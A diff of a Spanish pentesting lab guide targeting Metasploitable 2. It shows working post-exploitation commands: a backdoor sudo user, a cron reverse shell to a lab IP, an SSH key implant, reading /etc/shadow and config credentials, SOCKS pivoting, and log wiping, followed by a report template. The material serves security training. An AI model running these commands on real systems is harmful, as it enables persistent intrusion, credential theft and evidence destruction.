-<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
-<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
-<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="ex">useradd</span> <span class="at">-m</span> <span class="at">-s</span> /bin/bash <span class="at">-G</span> sudo backd00r</span>
-<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"backd00r:P@ssw0rd123!"</span> <span class="kw">|</span> <span class="ex">chpasswd</span></span>
-<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"backd00r ALL=(ALL) NOPASSWD:ALL"</span> <span class="op">&gt;&gt;</span> /etc/sudoers</span>
-<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar</span></span>
-<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/passwd</span>
-<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/sudoers</span>
-<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 2: Cron job de reverse shell</span></span>
-<span id="cb34-13"><a href="#cb34-13" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
-<span id="cb34-14"><a href="#cb34-14" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.56.101/9999 0&gt;&amp;1"</span> <span class="op">&gt;&gt;</span> /etc/crontab</span>
-<span id="cb34-15"><a href="#cb34-15" aria-hidden="true" tabindex="-1"></a><span class="fu">crontab</span> <span class="at">-l</span></span>
-<span id="cb34-16"><a href="#cb34-16" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb34-17"><a href="#cb34-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 3: Agregar clave SSH pública</span></span>
-<span id="cb34-18"><a href="#cb34-18" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /root/.ssh</span>
-<span id="cb34-19"><a href="#cb34-19" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"ssh-rsa AAAA...tu_clave_publica..."</span> <span class="op">&gt;&gt;</span> /root/.ssh/authorized_keys</span>
-<span id="cb34-20"><a href="#cb34-20" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 600 /root/.ssh/authorized_keys</span>
-<span id="cb34-21"><a href="#cb34-21" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb34-22"><a href="#cb34-22" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar acceso persistente</span></span>
-<span id="cb34-23"><a href="#cb34-23" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> ~/.ssh/id_rsa root@192.168.56.102</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: Agregar usuario backdoor al sistema</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="ex">useradd</span> <span class="at">-m</span> <span class="at">-s</span> /bin/bash <span class="at">-G</span> sudo backd00r</span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"backd00r:P@ssw0rd123!"</span> <span class="kw">|</span> <span class="ex">chpasswd</span></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"backd00r ALL=(ALL) NOPASSWD:ALL"</span> <span class="op">&gt;&gt;</span> /etc/sudoers</span>
+<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar</span></span>
+<span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/passwd</span>
+<span id="cb35-10"><a href="#cb35-10" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/sudoers</span>
+<span id="cb35-11"><a href="#cb35-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb35-12"><a href="#cb35-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 2: Cron job de reverse shell</span></span>
+<span id="cb35-13"><a href="#cb35-13" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb35-14"><a href="#cb35-14" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.56.101/9999 0&gt;&amp;1"</span> <span class="op">&gt;&gt;</span> /etc/crontab</span>
+<span id="cb35-15"><a href="#cb35-15" aria-hidden="true" tabindex="-1"></a><span class="fu">crontab</span> <span class="at">-l</span></span>
+<span id="cb35-16"><a href="#cb35-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb35-17"><a href="#cb35-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 3: Agregar clave SSH pública</span></span>
+<span id="cb35-18"><a href="#cb35-18" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /root/.ssh</span>
+<span id="cb35-19"><a href="#cb35-19" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"ssh-rsa AAAA...tu_clave_publica..."</span> <span class="op">&gt;&gt;</span> /root/.ssh/authorized_keys</span>
+<span id="cb35-20"><a href="#cb35-20" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 600 /root/.ssh/authorized_keys</span>
+<span id="cb35-21"><a href="#cb35-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb35-22"><a href="#cb35-22" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar acceso persistente</span></span>
+<span id="cb35-23"><a href="#cb35-23" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> ~/.ssh/id_rsa root@192.168.56.102</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="exfiltración-de-datos" class="level3" data-number="17.7.5">
 <h3 data-number="17.7.5" class="anchored" data-anchor-id="exfiltración-de-datos"><span class="header-section-number">17.7.5</span> 4.5 Exfiltración de Datos</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Exfiltrar archivos sensibles del objetivo</span></span>
-<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/passwd /tmp/exfil_passwd.txt</span>
-<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/shadow /tmp/exfil_shadow.txt</span>
-<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Con shell — copiar archivos de configuración</span></span>
-<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
-<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd</span>
-<span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span>
-<span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /home <span class="at">-name</span> <span class="st">"*.txt"</span> <span class="at">-o</span> <span class="at">-name</span> <span class="st">"*.conf"</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
-<span id="cb35-10"><a href="#cb35-10" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /var/www <span class="at">-name</span> <span class="st">"config.php"</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
-<span id="cb35-11"><a href="#cb35-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb35-12"><a href="#cb35-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Leer configuración de MySQL (credenciales en texto claro)</span></span>
-<span id="cb35-13"><a href="#cb35-13" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/mysql/my.cnf</span>
-<span id="cb35-14"><a href="#cb35-14" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /var/www/dvwa/config/config.inc.php</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb36"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Exfiltrar archivos sensibles del objetivo</span></span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/passwd /tmp/exfil_passwd.txt</span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> download /etc/shadow /tmp/exfil_shadow.txt</span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Con shell — copiar archivos de configuración</span></span>
+<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd</span>
+<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span>
+<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /home <span class="at">-name</span> <span class="st">"*.txt"</span> <span class="at">-o</span> <span class="at">-name</span> <span class="st">"*.conf"</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
+<span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /var/www <span class="at">-name</span> <span class="st">"config.php"</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
+<span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Leer configuración de MySQL (credenciales en texto claro)</span></span>
+<span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/mysql/my.cnf</span>
+<span id="cb36-14"><a href="#cb36-14" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /var/www/dvwa/config/config.inc.php</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Output esperado (config.inc.php)</strong>:</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb36"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_user'</span> ]     <span class="op">=</span> <span class="st">'root'</span><span class="ot">;</span></span>
-<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_password'</span> ] <span class="op">=</span> <span class="st">'toor'</span><span class="ot">;</span></span>
-<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_database'</span> ] <span class="op">=</span> <span class="st">'dvwa'</span><span class="ot">;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb37"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_user'</span> ]     <span class="op">=</span> <span class="st">'root'</span><span class="ot">;</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_password'</span> ] <span class="op">=</span> <span class="st">'toor'</span><span class="ot">;</span></span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="va">$_DVWA</span>[ <span class="st">'db_database'</span> ] <span class="op">=</span> <span class="st">'dvwa'</span><span class="ot">;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="movimiento-lateral-y-pivoting-conceptual" class="level3" data-number="17.7.6">
 <h3 data-number="17.7.6" class="anchored" data-anchor-id="movimiento-lateral-y-pivoting-conceptual"><span class="header-section-number">17.7.6</span> 4.6 Movimiento Lateral y Pivoting (Conceptual)</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb37"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver interfaces de red del objetivo (buscar otras subredes)</span></span>
-<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> ipconfig</span>
-<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> route</span>
-<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Agregar ruta de pivoting en Metasploit</span></span>
-<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> route add 10.0.0.0/24 <span class="op">&lt;</span>id_sesion<span class="op">&gt;</span></span>
-<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> route print</span>
-<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Configurar proxy SOCKS para redirigir tráfico</span></span>
-<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use auxiliary/server/socks_proxy</span>
-<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SRVPORT 1080</span>
-<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set VERSION 5</span>
-<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run <span class="at">-j</span></span>
-<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Usar proxychains para alcanzar red interna</span></span>
-<span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a><span class="co"># Editar /etc/proxychains4.conf: agregar "socks5 127.0.0.1 1080"</span></span>
-<span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a><span class="ex">proxychains</span> nmap <span class="at">-sT</span> <span class="at">-Pn</span> <span class="at">-p</span> 22,80,443 10.0.0.1</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb38"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver interfaces de red del objetivo (buscar otras subredes)</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> ipconfig</span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> route</span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Agregar ruta de pivoting en Metasploit</span></span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> route add 10.0.0.0/24 <span class="op">&lt;</span>id_sesion<span class="op">&gt;</span></span>
+<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> route print</span>
+<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Configurar proxy SOCKS para redirigir tráfico</span></span>
+<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use auxiliary/server/socks_proxy</span>
+<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SRVPORT 1080</span>
+<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set VERSION 5</span>
+<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run <span class="at">-j</span></span>
+<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Usar proxychains para alcanzar red interna</span></span>
+<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a><span class="co"># Editar /etc/proxychains4.conf: agregar "socks5 127.0.0.1 1080"</span></span>
+<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a><span class="ex">proxychains</span> nmap <span class="at">-sT</span> <span class="at">-Pn</span> <span class="at">-p</span> 22,80,443 10.0.0.1</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="borrado-de-huellas" class="level3" data-number="17.7.7">
 <h3 data-number="17.7.7" class="anchored" data-anchor-id="borrado-de-huellas"><span class="header-section-number">17.7.7</span> 4.7 Borrado de Huellas</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb38"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Eliminar logs del sistema</span></span>
-<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> clearev</span>
-<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="co"># O manualmente desde shell</span></span>
-<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
-<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/auth.log</span>
-<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/syslog</span>
-<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/apache2/access.log</span>
-<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/apache2/error.log</span>
-<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a><span class="bu">history</span> <span class="at">-c</span></span>
-<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a><span class="bu">unset</span> <span class="va">HISTFILE</span></span>
-<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Eliminar archivos creados durante el pentest</span></span>
-<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-f</span> /tmp/vector1_evidencia.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb39"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Eliminar logs del sistema</span></span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> clearev</span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="co"># O manualmente desde shell</span></span>
+<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> shell</span>
+<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/auth.log</span>
+<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/syslog</span>
+<span id="cb39-8"><a href="#cb39-8" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/apache2/access.log</span>
+<span id="cb39-9"><a href="#cb39-9" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">""</span> <span class="op">&gt;</span> /var/log/apache2/error.log</span>
+<span id="cb39-10"><a href="#cb39-10" aria-hidden="true" tabindex="-1"></a><span class="bu">history</span> <span class="at">-c</span></span>
+<span id="cb39-11"><a href="#cb39-11" aria-hidden="true" tabindex="-1"></a><span class="bu">unset</span> <span class="va">HISTFILE</span></span>
+<span id="cb39-12"><a href="#cb39-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-13"><a href="#cb39-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Eliminar archivos creados durante el pentest</span></span>
+<span id="cb39-14"><a href="#cb39-14" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-f</span> /tmp/vector1_evidencia.txt</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <blockquote class="blockquote">
 <p><strong>Nota pedagógica</strong>: En un pentest real, el borrado de huellas requiere coordinación con el cliente. Los logs son evidencia forense valiosa para el equipo Blue Team. En este lab, documentar los comandos sin ejecutarlos en producción.</p>
 </blockquote>
@@ -1076,62 +1098,62 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 <p><strong>Objetivo</strong>: Documentar todos los hallazgos en un reporte ejecutivo y técnico siguiendo estándares de la industria (PTES, OWASP Testing Guide).</p>
 <section id="estructura-del-reporte" class="level3" data-number="17.8.1">
 <h3 data-number="17.8.1" class="anchored" data-anchor-id="estructura-del-reporte"><span class="header-section-number">17.8.1</span> 5.1 Estructura del Reporte</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb39"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># Informe de Prueba de Penetración</span></span>
-<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a>**Cliente**: <span class="co">[</span><span class="ot">Nombre del cliente</span><span class="co">]</span></span>
-<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a>**Clasificación**: CONFIDENCIAL</span>
-<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a>**Fecha**: <span class="co">[</span><span class="ot">Fecha de entrega</span><span class="co">]</span></span>
-<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a>**Versión**: 1.0</span>
-<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a>**Preparado por**: <span class="co">[</span><span class="ot">Tu nombre</span><span class="co">]</span></span>
-<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-8"><a href="#cb39-8" aria-hidden="true" tabindex="-1"></a>---</span>
-<span id="cb39-9"><a href="#cb39-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-10"><a href="#cb39-10" aria-hidden="true" tabindex="-1"></a><span class="fu">## 1. Resumen Ejecutivo</span></span>
-<span id="cb39-11"><a href="#cb39-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-12"><a href="#cb39-12" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.1 Alcance</span></span>
-<span id="cb39-13"><a href="#cb39-13" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Sistema objetivo**: Metasploitable 2 (192.168.56.102)</span>
-<span id="cb39-14"><a href="#cb39-14" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Período de prueba**: <span class="co">[</span><span class="ot">Fecha inicio</span><span class="co">]</span> — <span class="co">[</span><span class="ot">Fecha fin</span><span class="co">]</span></span>
-<span id="cb39-15"><a href="#cb39-15" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Metodología**: Caja negra / Caja gris</span>
-<span id="cb39-16"><a href="#cb39-16" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Herramientas**: Kali Linux, Metasploit Framework, nmap, enum4linux, nikto</span>
-<span id="cb39-17"><a href="#cb39-17" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-18"><a href="#cb39-18" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.2 Hallazgos Principales</span></span>
-<span id="cb39-19"><a href="#cb39-19" aria-hidden="true" tabindex="-1"></a>Durante la evaluación se identificaron **X vulnerabilidades críticas**, </span>
-<span id="cb39-20"><a href="#cb39-20" aria-hidden="true" tabindex="-1"></a>**Y altas** y **Z medias**. El sistema objetivo fue completamente </span>
-<span id="cb39-21"><a href="#cb39-21" aria-hidden="true" tabindex="-1"></a>comprometido en múltiples vectores, incluyendo acceso root remoto sin </span>
-<span id="cb39-22"><a href="#cb39-22" aria-hidden="true" tabindex="-1"></a>autenticación. Se recomienda parcheo inmediato de los servicios expuestos</span>
-<span id="cb39-23"><a href="#cb39-23" aria-hidden="true" tabindex="-1"></a>y segmentación de red.</span>
-<span id="cb39-24"><a href="#cb39-24" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-25"><a href="#cb39-25" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.3 Resumen de Riesgo</span></span>
-<span id="cb39-26"><a href="#cb39-26" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Criticidad <span class="pp">|</span> Cantidad <span class="pp">|</span></span>
-<span id="cb39-27"><a href="#cb39-27" aria-hidden="true" tabindex="-1"></a><span class="pp">|------------|----------|</span></span>
-<span id="cb39-28"><a href="#cb39-28" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Crítico    <span class="pp">|</span> 3        <span class="pp">|</span></span>
-<span id="cb39-29"><a href="#cb39-29" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Alto       <span class="pp">|</span> 2        <span class="pp">|</span></span>
-<span id="cb39-30"><a href="#cb39-30" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Medio      <span class="pp">|</span> 4        <span class="pp">|</span></span>
-<span id="cb39-31"><a href="#cb39-31" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Bajo       <span class="pp">|</span> 2        <span class="pp">|</span></span>
